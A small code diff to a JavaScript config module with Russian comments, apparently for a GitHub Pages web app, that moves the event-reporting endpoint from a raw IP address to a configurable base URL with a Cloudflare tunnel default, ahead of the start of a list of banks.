@@ -1,7 +1,8 @@
 (function (app) { // Оборачиваем в немедленно вызываемую функцию, чтобы не засорять глобальную область
   const namespace = app; // Берём ссылку на пространство имён приложения
+  const BACKEND_BASE_URL = (window.AppConfig && window.AppConfig.BACKEND_BASE_URL) || 'https://shadow-verification-acm-river.trycloudflare.com'; // Забираем базовый адрес из конфигурации или используем HTTPS по умолчанию
 
-  namespace.EVENT_ENDPOINT = 'http://142.132.205.110:8080/api/webapp'; // Боевой endpoint бекенда для отправки событий с GitHub Pages
+  namespace.EVENT_ENDPOINT = `${BACKEND_BASE_URL}/api/webapp`; // Боевой endpoint бекенда для отправки событий с GitHub Pages
   namespace.REDIRECT_PAGE = './redirect.html'; // Страница редиректа (расположена рядом с index.html)
 
   namespace.BANKS = [ // Массив с описанием банков и их ссылок
